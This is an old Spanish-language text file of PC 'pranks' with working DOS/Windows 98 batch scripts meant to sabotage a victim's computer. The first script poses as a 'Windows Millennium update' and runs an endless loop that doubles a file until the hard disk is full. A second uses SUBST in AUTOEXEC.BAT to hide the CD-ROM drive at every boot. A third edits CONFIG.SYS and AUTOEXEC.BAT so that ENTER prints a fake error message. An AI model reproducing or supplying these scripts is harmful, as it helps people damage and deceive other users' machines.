PUTADA 1.3.1: Lleno por favor

Vamos a joder un poco el disco duro de ese/a pringao... vamos a llenarselo un poquitin.

Para esta putada utilizaremos un archivo BAT, una de las pocas cosas buenas que le quedan a windows. La idea es hacer un "mini programa" que llene el HD de mierda de forma exponencial:

----Inicio del archivo----
@echo off
cls
echo.
echo Actualización de Windows 98 a Windows Millenium...
echo La operación puede durar varios minutos, si el ordenador se bloquea...
echo Tirelo! XDD
echo Apreta una tecla pa empesarr!
pause >null
echo Fucking your OS >> c:\windows\win23.ddl
:label
type C:\windows\win23.ddl >> c:\windows\win232.ddl
type c:\windows\win232.ddl >> c:\windows\win23.ddl
goto label
----Fin del archivo----

Si analizais un poco la secuencia vereis que es una tonteria, pero con esta conseguimos crear un bucle infinito que genera un archivo que crece de forma exponencial... en cuestion de minutos el HD quedara llenitor.

PUTADA 1.5.1: Fuckinï CD ROM

Antes de empezar queria decir que en el momento de escribir este triste DOC la putadilla funcionaba...

Nuevamente utilizaremos comandos del DOS.. en esta ocasión el SUBST. Lo que hace este comando es asociar un directorio a una unidad virtual... nosotros lo utilizaremos para asignar un directorio a la unidad de cd-rom, generalmente la D:, de este modo dejara de existir.

La sintaxi de SUBST es... un momento que lo miro...: SUBST UNIDAD1 RUTA donde UNIDAD es la unidad virtual RUTA: directorio donde apuntara
ej: SUBST D: C:\CON\CON (}:>)

Pos nada... pa que se active cada vez que se encienda el PC añadir la linea en el AUTOEXEC.BAT
 

PUTADA 1.6.1: Joder el DOS

El principal problema de esta putadilla es que actualmente nadie usa el DOS, y los pocos que lo usan ya saben mas o menos de que va la cosa, pero bueno... por amor al arte que dicen.

Consiste en modificar la tabla de carácteres, de manera que cuando presionemos una tecla se producza una respuesta distinta a la esperada, por ejemplo, que cuando presionemos la letra A nos escriba B.

En el siguiente ejemplo se ve como hacer que nos aparezca el mensaje "Comando o nombre de archivo incorrecto" cada vez que presionemos ENTER (ascii 13)

----Inicio archivo----
@echo off
echo device=c:\windows\command\ansi.sys >> c:\config.sys
echo prompt $e[13;"Comando o archivo de nombre incorrecto";13p$p$g >> c:\autoexec.bat
----Final archivo----

Podeis ver como es necesario tener el controlador ansi.sys instalado... por lo que refiere a la sintaxis viene a ser una cosa as¡: prompt EVENTO;RESPUESTA
